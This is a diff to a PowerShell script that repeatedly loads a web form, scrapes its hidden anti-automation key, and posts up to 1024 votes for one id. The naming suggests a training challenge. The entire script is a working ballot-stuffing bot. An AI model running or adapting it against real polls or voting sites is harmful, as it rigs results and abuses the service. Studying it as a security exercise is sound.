@@ -14,18 +14,21 @@ $headers = @{
 'ContentLength' = 512
 }
 
-for($i=1; $i -le 4096; $i++){
+for($i=1; $i -le 1024; $i++){
 
     $page = Invoke-WebRequest $url -Method Get -SessionVariable hodor;
-    $elements_a = $page.ParsedHtml.getElementsByTagName('input') | ?{$_.getAttribute('type') -eq "hidden"} |
-    select -ExpandProperty outerHTML;
-    $parse = $elements_a -split " "
+
+    $parse = $page -split ' '
     $match_key = $parse -match 'value'
-    $match_key = $match_key -split "="
+    $match_key = $match_key -split '='
 
-    $body = @{'id'='3922';'holdthedoor'="holdthedoor";'key'=$match_key[1]}
+    $body = @{'id'='3922';'holdthedoor'="holdthedoor";'key'=$match_key[1].replace("`"","")}
 
-    $IRM = Invoke-RestMethod -Method 'Post' -Uri $url -Body $body -WebSession $hodor
+    $IRM = Invoke-RestMethod -Method 'Post' -Uri $url -Body $body -Headers $headers -WebSession $hodor
+
+    Write-Host "Sendig vote " -NoNewline
+    Write-Host $i -NoNewline -ForegroundColor Red
+    write-host $IRM.ResponseHeadersVariable
 }
 
 Write-Output "sucessfull voting"
